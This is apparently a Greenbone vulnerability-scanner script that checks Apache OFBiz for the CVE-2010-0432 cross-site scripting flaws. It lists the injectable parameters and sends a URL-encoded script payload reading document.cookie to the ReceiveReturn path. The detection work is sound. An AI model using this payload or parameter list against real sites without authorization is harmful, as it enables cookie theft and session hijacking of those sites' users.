CPE = "cpe:/a:apache:ofbiz";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.901105" );
	script_version( "2021-09-01T09:31:49+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 09:31:49 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-04-29 10:04:32 +0200 (Thu, 29 Apr 2010)" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_cve_id( "CVE-2010-0432" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "Apache OFBiz Multiple XSS Vulnerabilities (CVE-2010-0432)" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "apache_ofbiz_http_detect.sc" );
	script_mandatory_keys( "apache/ofbiz/detected" );
	script_require_ports( "Services/www", 8443 );
	script_tag( name: "summary", value: "Apache OFBiz is prone to multiple cross-site scripting (XSS)
  vulnerabilities." );
	script_tag( name: "insight", value: "The flaws are caused by improper validation of user-supplied input via,

  - the productStoreId parameter to control/exportProductListing,

  - the partyId parameter to partymgr/control/viewprofile,

  - the start parameter to myportal/control/showPortalPage,

  - an invalid URI beginning with /facility/control/ReceiveReturn,

  - the contentId parameter to ecommerce/control/ViewBlogArticle,

  - the entityName parameter to webtools/control/FindGeneric, or the

  - subject or content parameter to an unspecified component under ecommerce/control/contactus." );
	script_tag( name: "impact", value: "Successful attack could lead to execution of arbitrary HTML and
  script code in the context of an affected site and attackers can steal cookie-based authentication
  credentials." );
	script_tag( name: "affected", value: "Apache OFBiz 9.04 SVN Revision 920371 and prior." );
	script_tag( name: "solution", value: "Update to the latest version of Apache OFBiz." );
	script_xref( name: "URL", value: "http://seclists.org/bugtraq/2010/Apr/139" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/510746" );
	script_xref( name: "URL", value: "http://www.bonsai-sec.com/en/research/vulnerabilities/apacheofbiz-multiple-xss-0103.php" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = "/facility/control/ReceiveReturn%22%3Cb%3E%3Cbody%20" + "onLoad=%22alert(document.cookie)%22%3E%3Cbr%3E%3Cdi" + "v%3E%3E%3C!--";
if(http_vuln_check( port: port, url: url, pattern: "alert\\(document\\.cookie\\)", check_header: TRUE )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

